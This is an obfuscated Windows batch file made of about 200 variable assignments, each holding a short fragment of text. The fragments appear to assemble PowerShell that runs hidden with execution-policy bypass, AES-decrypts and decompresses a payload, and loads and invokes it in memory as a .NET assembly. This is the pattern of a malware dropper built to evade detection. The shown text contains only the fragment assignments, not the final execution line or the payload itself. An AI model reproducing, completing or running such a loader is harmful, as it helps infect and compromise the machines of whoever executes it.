@echo off
!wKBrAYVCWPaeXGdarZQH! "yQWcpkmTlp=5I/M"
!wKBrAYVCWPaeXGdarZQH! "qxnCNoWsSs=morF"
!wKBrAYVCWPaeXGdarZQH! "LLOWFWfzzu= $pa"
!wKBrAYVCWPaeXGdarZQH! "vZHXGLeaja=yste"
!wKBrAYVCWPaeXGdarZQH! "RLfXOTMkwt=ct S"
!wKBrAYVCWPaeXGdarZQH! "wsXfbuFXXO=..-1"
!wKBrAYVCWPaeXGdarZQH! "tTlVCgRhhg=onve"
!wKBrAYVCWPaeXGdarZQH! "LVjfbMBqjJ=To($"
!wKBrAYVCWPaeXGdarZQH! "oMUdlQLMhA=pres"
!wKBrAYVCWPaeXGdarZQH! "mCZgqvGuhq=LOtg"
!wKBrAYVCWPaeXGdarZQH! "kRnXczIvmg=	$de"
!wKBrAYVCWPaeXGdarZQH! "KuBOemujru=	$Zi"
!wKBrAYVCWPaeXGdarZQH! "HHuWvJglsR=s_fu"
!wKBrAYVCWPaeXGdarZQH! "owWCIgBbwB=:: '"
!wKBrAYVCWPaeXGdarZQH! "unfZYULfQK=e]::"
!wKBrAYVCWPaeXGdarZQH! "FbOzpjcNFz=oLHe"
!wKBrAYVCWPaeXGdarZQH! "yFcOncdrqG=lit("
!wKBrAYVCWPaeXGdarZQH! "aEYrxPlsZm=-16]"
!wKBrAYVCWPaeXGdarZQH! "lzEgfHpHvy=ar=$"
!wKBrAYVCWPaeXGdarZQH! "OUwQqYhxjs=am_v"
!wKBrAYVCWPaeXGdarZQH! "JftUhWLiud=, $p"
!wKBrAYVCWPaeXGdarZQH! "IjXmUflpuB=plit"
!wKBrAYVCWPaeXGdarZQH! "PqjgiUXAPG=($vz"
!wKBrAYVCWPaeXGdarZQH! "zcsRBFTGEM=ad1_"
!wKBrAYVCWPaeXGdarZQH! "uqLgdnulKP=ormF"
!wKBrAYVCWPaeXGdarZQH! "OxJXggolkB==$vz"
!wKBrAYVCWPaeXGdarZQH! "GcCwDXFQaV=($pa"
!wKBrAYVCWPaeXGdarZQH! "hsTXkGhtzr=($pa"
!wKBrAYVCWPaeXGdarZQH! "SldVEaMYpS=ram_"
!wKBrAYVCWPaeXGdarZQH! "ukphCXegRy=m.Co"
!wKBrAYVCWPaeXGdarZQH! "devSHKKucE=tion"
!wKBrAYVCWPaeXGdarZQH! "obyeXGXwQU=UvKe"
!wKBrAYVCWPaeXGdarZQH! "zVjuKcFwbK=ose("
!wKBrAYVCWPaeXGdarZQH! "YfHHcAXjGp=R=Ne"
!wKBrAYVCWPaeXGdarZQH! "qmCFiAsSrt=mpre"
!wKBrAYVCWPaeXGdarZQH! "AyejXMoJNg=ompr"
!wKBrAYVCWPaeXGdarZQH! "cUAJzpBtPj=load"
!wKBrAYVCWPaeXGdarZQH! "FWyySJlchV=yle "
!wKBrAYVCWPaeXGdarZQH! "vBAaJDRnqv=	$kW"
!wKBrAYVCWPaeXGdarZQH! "PAnkRskCmD=teDe"
!wKBrAYVCWPaeXGdarZQH! "PznSNlTpMn=irtS"
!wKBrAYVCWPaeXGdarZQH! "nqqoeocLPz=decr"
!wKBrAYVCWPaeXGdarZQH! "DXpNmkDzSn=$hos"
!wKBrAYVCWPaeXGdarZQH! "IyIATEtNqW=aes_"
!wKBrAYVCWPaeXGdarZQH! "lMfPMiDILt=[Sys"
!wKBrAYVCWPaeXGdarZQH! "DkVpPaRSzs=nver"
!wKBrAYVCWPaeXGdarZQH! "xkqmVcLqzw=tor_"
!wKBrAYVCWPaeXGdarZQH! "BBxXeuVSBk=n.Co"
!wKBrAYVCWPaeXGdarZQH! "DuIooofKQd=ke($"
!wKBrAYVCWPaeXGdarZQH! "bfMLBKlWXp=ess_"
!wKBrAYVCWPaeXGdarZQH! "AmdGQpNOcB=ar[0"
!wKBrAYVCWPaeXGdarZQH! "rpaOwwcWpV= Sys"
!wKBrAYVCWPaeXGdarZQH! "fBMwVGehuP=t=$k"
!wKBrAYVCWPaeXGdarZQH! "OCHiqKqXVM=-4] "
!wKBrAYVCWPaeXGdarZQH! "yBYAqmdLij=hidd"
!wKBrAYVCWPaeXGdarZQH! "FPmtPJTiop=.Aes"
!wKBrAYVCWPaeXGdarZQH! "wNFFAdjxiv=reak"
!wKBrAYVCWPaeXGdarZQH! "IUlEZRyviJ=ing="
!wKBrAYVCWPaeXGdarZQH! "GVfXwPtTdZ=ment"
!wKBrAYVCWPaeXGdarZQH! "AHtaiMaSFK=tS46"
!wKBrAYVCWPaeXGdarZQH! "LOvfRSVjPt=gnir"
!wKBrAYVCWPaeXGdarZQH! "bfFDoIlCBc=ity."
!wKBrAYVCWPaeXGdarZQH! "OphDCeztXq=indo"
!wKBrAYVCWPaeXGdarZQH! "DSMUfBQJqa=0LU3"
!wKBrAYVCWPaeXGdarZQH! "JuPwyqxLWk=d2_v"
!wKBrAYVCWPaeXGdarZQH! "zzOJGEzUoi=s_va"
!wKBrAYVCWPaeXGdarZQH! "iWVTwGcDvi=a);	"
!wKBrAYVCWPaeXGdarZQH! "chZpmnLDcO=g(3)"
!wKBrAYVCWPaeXGdarZQH! "zNeyrSaceN=join"
!wKBrAYVCWPaeXGdarZQH! "GWmCceZfaZ=ad2_"
!wKBrAYVCWPaeXGdarZQH! "ARwGYHejMg=cryp"
!wKBrAYVCWPaeXGdarZQH! "hXezEZibjw=).Sp"
!wKBrAYVCWPaeXGdarZQH! "UXwwuEDQmN=tion"
!wKBrAYVCWPaeXGdarZQH! "jaBXcwocYr=ep b"
!wKBrAYVCWPaeXGdarZQH! "KFjjUxVeTA=M=')"
!wKBrAYVCWPaeXGdarZQH! "GJmHxkdfmR=K) {"
!wKBrAYVCWPaeXGdarZQH! "lBjFRetqgR=;$pa"
!wKBrAYVCWPaeXGdarZQH! "LcXLQjzeux=WUjf"
!wKBrAYVCWPaeXGdarZQH! "Ryvrvigvrm=	$fB"
!wKBrAYVCWPaeXGdarZQH! "KNuGeDkYBU=exec"
!wKBrAYVCWPaeXGdarZQH! "hsZtdTtweX=6] -"
!wKBrAYVCWPaeXGdarZQH! "UzOvADriMu=($vz"
!wKBrAYVCWPaeXGdarZQH! "yVxAASwSEv=UqZ "
!wKBrAYVCWPaeXGdarZQH! "qmMZSkcSMM=);	$"
!wKBrAYVCWPaeXGdarZQH! "MwycbzDfUx=aes_"
!wKBrAYVCWPaeXGdarZQH! "ytNIZJoCFE=ne);"
!wKBrAYVCWPaeXGdarZQH! "PueIWdcpDw=fBaV"
!wKBrAYVCWPaeXGdarZQH! "JXUbwLswYt=se()"
!wKBrAYVCWPaeXGdarZQH! "mKCBypzgzC=tsWi"
!wKBrAYVCWPaeXGdarZQH! "mHdEFCelYX=(,[s"
!wKBrAYVCWPaeXGdarZQH! "fgQmJVkqbZ=ypas"
!wKBrAYVCWPaeXGdarZQH! "gdOmdTNxCi=ssio"
!wKBrAYVCWPaeXGdarZQH! "PtbbAMDtpL=de=["
!wKBrAYVCWPaeXGdarZQH! "cMKnQXBzYp=Syst"
!wKBrAYVCWPaeXGdarZQH! "RRcegsPZRo=2_va"
!wKBrAYVCWPaeXGdarZQH! "JacvgXCTiA=wDt."
!wKBrAYVCWPaeXGdarZQH! "ygKGgclGEc=tion"
!wKBrAYVCWPaeXGdarZQH! "NrkJLNJBFF=Subs"
!wKBrAYVCWPaeXGdarZQH! "QgEJuoXmLD=orF'"
!wKBrAYVCWPaeXGdarZQH! "rMpCYhvlua=oryS"
!wKBrAYVCWPaeXGdarZQH! "EbjUDzJDLe=rF'["
!wKBrAYVCWPaeXGdarZQH! "CkzpiYpsrq=IO.F"
!wKBrAYVCWPaeXGdarZQH! "JnSHiLAYqq=pose"
!wKBrAYVCWPaeXGdarZQH! "WxoQaTXDuY=n (["
!wKBrAYVCWPaeXGdarZQH! "VmCUJmUmhV=UvKe"
!wKBrAYVCWPaeXGdarZQH! "JNJttbvkwS=Invo"
!wKBrAYVCWPaeXGdarZQH! "EVpxQFWHed=Conv"
!wKBrAYVCWPaeXGdarZQH! "gTAaZZdRwN=')('"
!wKBrAYVCWPaeXGdarZQH! "mdNFufcPNQ=unct"
!wKBrAYVCWPaeXGdarZQH! "qJDNxJJXBL=$par"
!wKBrAYVCWPaeXGdarZQH! "bAjIjdldSH=d1_v"
!wKBrAYVCWPaeXGdarZQH! "vLZskSGjSO=wTit"
!wKBrAYVCWPaeXGdarZQH! "UsTrUFYuiJ=-nop"
!wKBrAYVCWPaeXGdarZQH! "WahCmmYlyu=n $p"
!wKBrAYVCWPaeXGdarZQH! "XjANTnhfPw=th);"
!wKBrAYVCWPaeXGdarZQH! "OnKxXbdsYu=aram"
!wKBrAYVCWPaeXGdarZQH! "UEyzGtEpvH=Syst"
!wKBrAYVCWPaeXGdarZQH! "OLpbCMYRkN=Cryp"
!wKBrAYVCWPaeXGdarZQH! "wucOyxRfWh=deco"
!wKBrAYVCWPaeXGdarZQH! "ktkbqEYAaj=retu"
!wKBrAYVCWPaeXGdarZQH! "YKnDLnSmEe=.Mem"
!wKBrAYVCWPaeXGdarZQH! "QiaVOcqKDx=:('g"
!wKBrAYVCWPaeXGdarZQH! "ZXvypkPeSV=t]::"
!wKBrAYVCWPaeXGdarZQH! "cRBOYHfTCJ=ssio"
!wKBrAYVCWPaeXGdarZQH! "ntxBXxtOEN=en -"
!wKBrAYVCWPaeXGdarZQH! "hbnJGNRqun=] -j"
!wKBrAYVCWPaeXGdarZQH! "ZvwgfJaJZx=Deco"
!wKBrAYVCWPaeXGdarZQH! "EmIlGXHPQo=essi"
!wKBrAYVCWPaeXGdarZQH! "dyEhZgPhIJ=6] -"
!wKBrAYVCWPaeXGdarZQH! "mSwtdZOFAi=trin"
!wKBrAYVCWPaeXGdarZQH! "ttRlrynmOh=morF"
!wKBrAYVCWPaeXGdarZQH! "UCqMELDhUx=tion"
!wKBrAYVCWPaeXGdarZQH! "rKmHEOfcdP=;	$a"
!wKBrAYVCWPaeXGdarZQH! "ApNxUGLgHf=.Cip"
!wKBrAYVCWPaeXGdarZQH! "VkSgarrgIe=decr"
!wKBrAYVCWPaeXGdarZQH! "FuwRkwptCS=;	$f"
!wKBrAYVCWPaeXGdarZQH! "MVVRkXgsUl=ispo"
!wKBrAYVCWPaeXGdarZQH! "oPnwpZotGS=Padd"
!wKBrAYVCWPaeXGdarZQH! "NZMVZMdtfW=]::C"
!wKBrAYVCWPaeXGdarZQH! "vjnGXHAjOv=func"
!wKBrAYVCWPaeXGdarZQH! "dwdYALrZrs=tor("
!wKBrAYVCWPaeXGdarZQH! "sXUBaDcIkl=ute_"
!wKBrAYVCWPaeXGdarZQH! "uqYJCeSbQi=null"
!wKBrAYVCWPaeXGdarZQH! "MtMWnLoBky=n ''"
!wKBrAYVCWPaeXGdarZQH! "FuzbuLaUDN=[Env"
!wKBrAYVCWPaeXGdarZQH! "yDfXzIozNi=Bf37"
!wKBrAYVCWPaeXGdarZQH! "fwYafgOyty=7;	$"
!wKBrAYVCWPaeXGdarZQH! "VwHkizXOwB=ecom"
!wKBrAYVCWPaeXGdarZQH! "ojdhNqdMlP=togr"
!wKBrAYVCWPaeXGdarZQH! "DvGuIaeQeg=.Dis"
!wKBrAYVCWPaeXGdarZQH! "DHABuxPJLC=aVa="
!wKBrAYVCWPaeXGdarZQH! "ZLXlCTFeqq=V=[S"
!wKBrAYVCWPaeXGdarZQH! "BqqyjCKyJg=rity"
!wKBrAYVCWPaeXGdarZQH! "oSGdRXDkBx=tem."
!wKBrAYVCWPaeXGdarZQH! "wGInqSrdag=.Cry"
!wKBrAYVCWPaeXGdarZQH! "aTqpDcaYAs=e=[S"
!wKBrAYVCWPaeXGdarZQH! "oUoXMqIpwv=var "
!wKBrAYVCWPaeXGdarZQH! "acnXUzbEyp={	$a"
!wKBrAYVCWPaeXGdarZQH! "ihGRdDgRrk=yloa"
!wKBrAYVCWPaeXGdarZQH! "cgHCpUBJOS=func"
!wKBrAYVCWPaeXGdarZQH! "dgyigYsZaL=func"
!wKBrAYVCWPaeXGdarZQH! "nKciwtbLJB=r.Mo"
!wKBrAYVCWPaeXGdarZQH! "djqyTqzfvh=Obje"
!wKBrAYVCWPaeXGdarZQH! "CIjiHOWotU='')("
!wKBrAYVCWPaeXGdarZQH! "LWiiiCOaYo=ile]"
!wKBrAYVCWPaeXGdarZQH! "INPcigOgwu=();}"
!wKBrAYVCWPaeXGdarZQH! "MeUZqScoOO=t.UI"
!wKBrAYVCWPaeXGdarZQH! "gBFMJtxKDI=ach "
!wKBrAYVCWPaeXGdarZQH! "shoInOiBtH=or_v"
!wKBrAYVCWPaeXGdarZQH! "IhAQYXpfUS=Key="
!wKBrAYVCWPaeXGdarZQH! "EIpBYJZOWI=.Ass"
!wKBrAYVCWPaeXGdarZQH! "QIxNxPOaSr=YMfs"
!wKBrAYVCWPaeXGdarZQH! "fShxIeZDte=unct"
!wKBrAYVCWPaeXGdarZQH! "tANKtDSUGn=aphy"
!wKBrAYVCWPaeXGdarZQH! "gONzdAeOWt=s_va"
!wKBrAYVCWPaeXGdarZQH! "BQHHKDIUNf=null"
!wKBrAYVCWPaeXGdarZQH! "sOsQReskKH=yloa"
!wKBrAYVCWPaeXGdarZQH! "oCKgKlTqhA=saBm"
!wKBrAYVCWPaeXGdarZQH! "TtYblyXJrd=e();"
!wKBrAYVCWPaeXGdarZQH! "FdzUpCYOQl=se()"
!wKBrAYVCWPaeXGdarZQH! "daBBEwnZms=;		b"
!wKBrAYVCWPaeXGdarZQH! "JVlimDzCho=aram"
!wKBrAYVCWPaeXGdarZQH! "ASzIFMdBsZ=6g=="
!wKBrAYVCWPaeXGdarZQH! "hjTAJMnEoR=Cryp"
!wKBrAYVCWPaeXGdarZQH! "LoLQJtGjes=tion"
!wKBrAYVCWPaeXGdarZQH! "OXMlZZAbbZ=ose("
!wKBrAYVCWPaeXGdarZQH! "cJKhJEDKEI=iron"
!wKBrAYVCWPaeXGdarZQH! "KtMTXtruRW=em.S"
!wKBrAYVCWPaeXGdarZQH! "WhASmJNChx=ity."
!wKBrAYVCWPaeXGdarZQH! "nVfNlQPboL=[-1."
!wKBrAYVCWPaeXGdarZQH! "nORUrAylhx=;exe"
!wKBrAYVCWPaeXGdarZQH! "iMBexJrThv=y.Pa"
!wKBrAYVCWPaeXGdarZQH! "YnxvtOUUeI=ewLi"
!wKBrAYVCWPaeXGdarZQH! "CalvfjCSjW=var."
!wKBrAYVCWPaeXGdarZQH! "fsStnqLxlF=_var"
!wKBrAYVCWPaeXGdarZQH! "BmMRRHFzHd=ar);"
!wKBrAYVCWPaeXGdarZQH! "sLwEAuqVsY=ypt_"
!wKBrAYVCWPaeXGdarZQH! "xkTEZZayex=ject"
!wKBrAYVCWPaeXGdarZQH! "sgRERXSYcW=fore"
!wKBrAYVCWPaeXGdarZQH! "fnqULHuVLY=Va.D"
!wKBrAYVCWPaeXGdarZQH! "jYpmuLvufb=ZipS"
